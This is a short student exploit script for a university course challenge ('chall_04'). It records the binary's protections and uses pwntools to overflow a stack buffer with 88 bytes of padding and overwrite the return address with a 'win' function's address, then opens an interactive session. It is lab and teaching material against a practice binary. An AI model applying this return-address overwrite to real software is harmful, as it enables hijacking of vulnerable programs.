'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_04
File Description:  Using a call to rax to call the win function, move 8 bytes to rax

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   67) Symbols       No    0               1               chall_04

File info:
chall_04: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6a88b76aa9eaaa7d5d9d3d9e8fe23506f2bb9379, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Variable 60h from rip, then 8 bytes for rip
'''

# Import libraries
from pwn import *

# Create payload
offset=b'a'*88   # 96 to eip, 4 or 8 for rip?
winAddr=p64(0x00401176)
payload=offset+winAddr
print(payload)
# Create process
p=process("./chall_04")
p.sendline(payload)#for nice unprintable payloads
# p.recv()
p.interactive()